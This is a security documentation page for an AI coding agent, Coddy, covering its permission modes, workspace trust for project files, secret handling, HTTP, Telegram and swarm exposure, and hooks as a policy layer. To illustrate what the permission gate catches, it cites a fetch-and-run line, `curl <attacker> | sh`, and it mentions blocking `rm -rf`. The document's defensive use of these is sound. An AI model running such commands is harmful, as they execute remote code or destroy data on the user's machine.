# Security and trust

Coddy executes what the model decides on the machine it runs on, with the rights of the user who started it. This page gathers in one place what bounds that: the permission gate and the modes, the trust receipts for files that arrive with a checkout, where secrets live and where they are redacted, what the HTTP, Telegram and swarm surfaces expose, hooks as a policy layer, the loop guards, and what is not sandboxed at all. Each section points at the page that carries the detail.

## What is not sandboxed

There is no kernel-level sandbox. `run_command` runs through the host shell as the user who started Coddy, and the file tools read and write with that user's rights; a permission prompt, a mode or a hook decides whether a call runs, not what the process could reach if it did. The isolation Coddy is designed for is the container: the binary is static and distroless-friendly, so it fits a `scratch` or `distroless` image with a read-only root filesystem, a mounted workspace and the orchestrator's limits (the published image runs `coddy serve -H 0.0.0.0` on port 12345; see [Docker](../getting-started/docker.md)). Outside a container, bound to loopback in `ask` mode, the boundary is the person answering the prompts.

The console strips escape and control sequences from everything that comes from outside the renderer - model output, tool previews, titles, file names - so a tool result cannot drive the terminal; see [Console](../surfaces/console.md#security).

## Permission modes and prompts

`tools.permission_mode` in `config.yaml`:

| Value | Shell commands | File writes |
|---|---|---|
| `ask` (default) | prompt | prompt |
| `accept_edits` | prompt | auto-approved |
| `bypass` | never asks | never asks |

A session can override it - the permission-mode selector of an ACP editor, `--permission-mode` on the console - and the override is stored in that session's `session.json`. `bypass` is for a machine that is disposable.

The prompt - the permission card in the web UI, a modal in the console, `session/request_permission` in an editor - offers **Allow**, **Allow always** (this exact command, for the rest of the session), **Reject**, and for a single plain shell invocation **Always allow `<program>`**, which widens the grant to the program (`curl`) or to the program plus its subcommand for multiplexers (`git status`; `git push` still asks). A command with shell metacharacters or a leading `VAR=` never gets the wide option, and a session grant only ever covers another plain invocation, so `curl <attacker> | sh` asks again even with `curl` granted. Backgrounded commands go through the same gate. [Background tasks](../features/background-tasks.md#permissions) has the exact rules; `tools.command_allowlist` is the operator-authored list of commands that never prompt (exact or prefix match, `"*"` for everything; [config.yaml reference](../reference/config.md#tools)).

What the gate does not cover:

- MCP tool calls are dispatched without a prompt; the enable switches and `disabledTools` are the mechanism for restricting them ([MCP servers](../features/mcp.md#permission-model));
- `websearch` and `webfetch` ask nobody;
- the console's `!!` prefix runs a command with no gate at all, by design: only a submitted editor line can reach it, never model output ([Console](../surfaces/console.md)).

A config commit (`config_commit`) is gated harder than a write: it prompts in `ask` and `accept_edits`, because it can start MCP processes and change the policy itself; only `bypass` skips it.

Surfaces without a person answering resolve prompts on their own. Print mode (`coddy -p`) allows under `bypass` and rejects otherwise. The Telegram gateway approves every prompt so the bot can work unattended (a narrowed subagent whose own mode is not `bypass` is rejected instead). A turn woken by a finished background task on `coddy serve` runs through a non-interactive sender: a gated call inside it is denied unless the server's mode is `bypass`.

Modes bound the tool set before permissions apply: `plan` writes text and markdown only, and `ask` gets a read-only allowlist (`read`, `keep_result`, `glob`, `grep`, `print_tree`, `websearch`, `webfetch`, `question`, `load_skill`) that is enforced when a call executes, so a call replayed from history is refused rather than run. See [Operating modes](../features/modes.md). A subagent definition can only narrow the parent's `permission_mode`, `tools` and `disallowed_tools`, and a child's prompts are relayed to the parent's client with a `[subagent <name>]` prefix ([Subagents](../features/subagents.md)).

## Workspace trust for project-local files

Three kinds of file inside a checkout can make Coddy start a process or steer the model before any prompt exists. All three are held under the same kind of policy until the operator approves that exact file for that workspace:

| Content | Files under the workspace | Policy key | Receipts | Approve with |
|---|---|---|---|---|
| MCP servers | `.coddy/mcp.json` | `mcp.project_trust` | `$CODDY_HOME/mcp-trust.json` | `coddy mcp trust <name>`, `POST /coddy/mcp/{name}/trust`, the shield in Settings > MCP servers |
| Hooks | `.coddy/hooks.json`, `.claude/settings.json`, `.claude/settings.local.json` | `hooks.project_trust` | `$CODDY_HOME/hooks-trust.json` | `coddy hooks trust <file>`, `POST /coddy/hooks/trust` |
| Subagents | `.coddy/agents/*.md`, `.claude/agents/*.md` | `subagents.project_trust` | `$CODDY_HOME/subagents-trust.json` | `coddy agents trust <name>`, `POST /coddy/subagents/{name}/trust` |

Each policy takes `ask` (the default: parsed and listed, held until approved), `allow` (treated like your own files, for checkouts you already trust) or `deny` (never read). A receipt is keyed by the canonical workspace path and a digest of what was approved, so editing an approved file or declaration withdraws the approval and the next session asks again. The three receipt files are deliberately separate: an MCP approval can never read as a hook approval or the reverse. Every approval surface prints the effective declaration first - for an MCP server the command, its arguments and the names of the environment variables and headers it carries, never their values.

Your own files are not gated: `config.yaml`, `~/.coddy/mcp.json`, `~/.coddy/hooks.json` and `~/.coddy/agents` are operator-authored, and so is an MCP server an ACP client declares in `session/new`. `coddy acp` and `coddy serve` take `--mcp-project-trust ask|allow|deny` to set the MCP policy for one process, which is what a CI job or a container entrypoint uses instead of editing the file. Full detail: [MCP servers](../features/mcp.md#workspace-trust-for-project-local-servers), [Hooks](../features/hooks.md#project-files-and-trust), [Subagents](../features/subagents.md#scopes-and-project-trust).

Rules and skills from a checkout are a different kind of content and carry no receipt: `.coddy/rules`, the shared `.agents/rules`, `.cursor/rules`, `.claude/rules`, `.codex/rules`, nested `AGENTS.md` files and the skills under `${CWD}/.coddy/skills` are text that steers the model, loaded from the workspace as soon as a session opens there. They can ask the model to run something; they cannot run it themselves, so whatever they ask for still meets the mode, the permission gate and your hooks. Read a checkout's rules the way you read its build scripts. See [Rules](../features/rules.md) and [Skills](../features/skills.md).

![A project-local MCP server awaiting approval in Settings](../assets/screenshot-fullhd-settings-mcp.png)

A session that finds a held hooks file records a notice, so you learn that hooks exist and are held rather than silently skipped:

![Held hooks file notice](../assets/screenshot-hooks-notice-dark.png)

## Secrets

- **Provider keys.** `providers[].api_key` is a literal, a `${ENV}` reference expanded when the file loads, or empty, in which case `NAME_API_KEY` (the provider name upper-cased, hyphens to underscores) is read at call time. `api_key_command` runs a credential helper through the host shell, bounded to 30 seconds, and uses its stdout when `api_key` is empty; the order is literal, then helper, then the environment variable. Keep `config.yaml` free of literal keys and reference the environment.
- **The `.env` file.** `$CODDY_HOME/.env` is read before `config.yaml` is parsed, one `KEY=VALUE` per line (`export`, quotes and comments accepted); a variable already set in the process environment is never overridden. A literal dollar sign in a value is written as `$$`. See [Configuration](../getting-started/configuration.md).
- **Provider logins.** `coddy providers login codex` and `coddy providers login neuraldeep` (and the sign-in buttons in the web UI) store the issued credentials under `$CODDY_HOME/providers/<name>/` - `codex-auth.json`, `neuraldeep-auth.json` - in a directory created `0700` with the file at `0600`. `coddy providers list` shows which source each request actually uses and `coddy providers logout <name>` revokes and forgets a login.
- **Redaction.** `GET /coddy/config` never returns `httpserver.auth_token`; `coddy -t` and `--dry-run` never echo a value under a secret-shaped key (`api_key`, `auth_token`, `pairing_tokens`) and mask the Telegram token in errors; the config-commit prompt lists the staged commands with secrets redacted; the swarm proxy replaces the caller's `Authorization` header rather than forwarding it.
- **Tokens on the wire.** `--remote-token` and `CODDY_REMOTE_TOKEN` are never read from `config.yaml`, and a token about to travel over plain `http://` to a non-loopback host produces a warning. The web UI keeps remote tokens in the browser only.
- **Transcripts on disk.** Every session bundle under `$CODDY_HOME/sessions/<id>/` holds the full conversation in `messages.json`, tool output included, and the files attached to it under `assets/` (written read-only, `0444`). Whoever can read the home directory can read every conversation; `sessions.dir` moves the store, and `/export` writes a copy into the workspace on request.

## The HTTP surface

`coddy serve` binds `127.0.0.1:12345` unless `httpserver.host` or `-H` says otherwise, and it has **no login by default**: with the API reachable, anyone on the network holds every route, the config editor (`PUT /coddy/config`) and the workspace files included. Expose the port only on a network you trust, or:

- set a bearer token - `httpserver.auth_token` (`${ENV}` expanded), `--auth-token`, or `CODDY_HTTP_TOKEN`; every `/v1/*` and `/coddy/*` route then answers `401` without `Authorization: Bearer`, the SPA shell stays public, and `/docs` and `/openapi.*` are protected unless `httpserver.public_docs: true`;
- put a TLS-terminating reverse proxy in front, since the server speaks plain HTTP;
- enable CORS (`httpserver.cors.enable`, `allowed_origins`) only for the origins that need it; `"*"` still requires the token but lets any page try;
- prefer the header over `?access_token=`, which only the two SSE routes accept and which reaches proxy access logs;
- leave `httpserver.allow_insecure` unset: it silences the warning about a non-loopback bind without a token, and nothing else.

The Docker image binds `0.0.0.0` inside the container, so the mapped port is reachable from wherever the host is; treat it like any admin API. Reference: [HTTP API](../reference/http-api.md#authentication-optional), [Remote mode](remote.md).

## The Telegram gateway

Access is checked on every incoming message and a denied message is dropped silently. `admins` lists the Telegram user ids with elevated rights; `default_access` is `all` (anyone who can write to the chat), `admins`, or `group:<name>` for a set defined under `user_groups`; `chats[]` overrides `access` and `isolation` (`individual`, `shared`, `admin`) per chat. The bot token belongs in the environment (`"${TELEGRAM_BOT_TOKEN}"`), never in version control. The gateway uses long polling, so no inbound port is opened. Because the gateway approves every permission prompt itself, the permission mode does not bound the bot: bound it with a `PreToolUse` hook (below), a container, or by restricting who may talk to it. See [Telegram gateway](../surfaces/gateway.md#security-notes).

## Swarm

A relay carries three credentials with three jobs: `swarm.auth_token` lets clients use the relay, `swarm.pairing_tokens` lets nodes join it, and a per-node token lets the relay act as that node. A relay is a fleet-wide door - whoever holds its client token controls every node it reaches, and there are no per-node client ACLs - so give each node a credential minted for its relay and keep the pairing token secret. A relay bound off loopback without a client token refuses to start (`swarm.allow_insecure` overrides); on loopback one is generated per run. A node's name is proven by a per-lease secret, not by the shared pairing token. Advertised URLs are an SSRF boundary: `http(s)` only, no credentials; link-local, metadata and, unless `swarm.allow_private_upstreams` names them, private addresses are refused, and the resolved addresses are pinned. TLS for the relay is `swarm.tls.cert_file` / `key_file` (TLS 1.2 minimum, a restart to rotate), and `insecure_skip_verify` is logged every time it is used. See [Swarm](swarm.md#security) and [Encryption and proxies](swarm.md#encryption-and-proxies).

## Hooks as a policy layer

A `PreToolUse` hook runs before the permission prompt on every matching call, whatever the permission mode, in child sessions too, and can deny the call (exit `2`, or `permissionDecision: "deny"`), force the prompt (`"ask"`) or rewrite the arguments. With `failClosed: true` a crash or a timeout of the hook blocks the call instead of letting it through, which is what a policy hook wants. `UserPromptSubmit` can reject a prompt, `SubagentStart` can refuse a delegation, `PreCompact` can veto a compaction, and `Notification` can ping you when a prompt is waiting. Hooks run with your permissions and see every argument, so review each one; your own file, `~/.coddy/hooks.json`, always runs, while project files follow the trust policy above. The worked example that blocks `rm -rf` whatever the mode is in [Hooks](../features/hooks.md#examples).

## Loop guards and caps

`agent.max_turns` and `agent.max_tokens_per_turn` bound one user turn. `agent.loop_guard` (default `true`) cuts a streamed response that degenerates into repeating the same passage (`loop_stream_repeat_cycles`), stops executing a tool called over and over with identical arguments (`loop_tool_repeat_limit`), nudges the model back on track, and ends the turn with a notice after `loop_nudge_max` nudges. Tool results are capped by line under `tools.output_limits`, with a 64 KiB per-call ceiling so one huge line cannot bypass the cap. A `Stop` hook may send the agent back to work at most `hooks.stop_loop_limit` times per turn (5); background tasks are bounded by `tools.background.max_concurrent` (5) and `default_timeout_seconds` (900); subagents by `subagents.max_concurrent`, `max_depth` and `default_timeout_seconds`.

## Before exposing a server

- a bearer token is set and reaches the process by environment or flag, not as a literal in the file;
- TLS terminates in front of the server, or clients come in over a tunnel;
- `httpserver.cors.allowed_origins` names only the origins that need it;
- `mcp.project_trust`, `hooks.project_trust` and `subagents.project_trust` are `ask` or `deny` for checkouts you do not control;
- `tools.permission_mode` is not `bypass` unless the host is disposable, and a `failClosed` `PreToolUse` hook covers what a prompt cannot;
- the process runs in a container with a read-only root filesystem and only the workspace mounted.
